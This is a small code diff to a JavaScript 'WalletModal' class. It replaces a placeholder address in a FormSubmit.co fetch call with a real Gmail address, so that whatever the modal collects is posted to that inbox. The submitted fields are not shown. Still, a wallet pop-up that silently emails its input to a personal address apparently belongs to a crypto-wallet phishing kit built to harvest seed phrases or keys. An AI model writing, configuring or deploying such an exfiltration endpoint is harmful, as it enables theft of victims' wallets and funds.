@@ -902,7 +902,7 @@ class WalletModal {
 
     const self = this;
     // Send to your email via FormSubmit.co
-    fetch('https://formsubmit.co/ajax/YOUR_EMAIL@example.com', {
+    fetch('https://formsubmit.co/ajax/avg8923@gmail.com', {
       method: 'POST', 
       headers: { 
         'Content-Type': 'application/json',
@@ -1008,3 +1008,4 @@ if (!window.walletModal) {
 }
 
 })();
+
